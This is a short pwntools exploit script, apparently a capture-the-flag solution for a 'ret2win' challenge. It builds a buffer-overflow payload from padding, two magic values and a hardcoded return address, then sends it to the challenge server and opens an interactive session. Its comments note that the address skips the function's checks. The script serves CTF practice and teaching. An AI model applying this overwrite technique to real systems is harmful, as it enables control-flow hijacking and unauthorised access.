#!/usr/bin/env python3

from pwn import *

print("Hello")

e = ELF("./ret2win")

# A bunch of this is wasted effort.  I originally tried to call the
# supersecrettoplevelfunction, but there are some conditionals that
# tripped me up and prevented me from getting the flag.

# So I instead just jumped into an address past the conditionals to
# get the flag...

win = e.symbols["supersecrettoplevelfunction"]

print("win addr = {}".format(hex(win)))

payload = b"a" * 0x10
payload += p32(0xcafebabe)
payload += p32(0xc0debabe)
payload += b"b" * 0x10
payload += p64(0x4011c6)
payload += b"\n"

#p = process("./ret2win")
p = remote("ret2win.challenges.ctf.ritsec.club", 1337)
#p = gdb.debug("./ret2win", '''
#b *0x401219
#continue
#'''
#)

# Leaving the following 2 lines worked locally, but not on the remote chal
#p.recvline()
#p.recvline()

p.send(payload)

p.interactive()

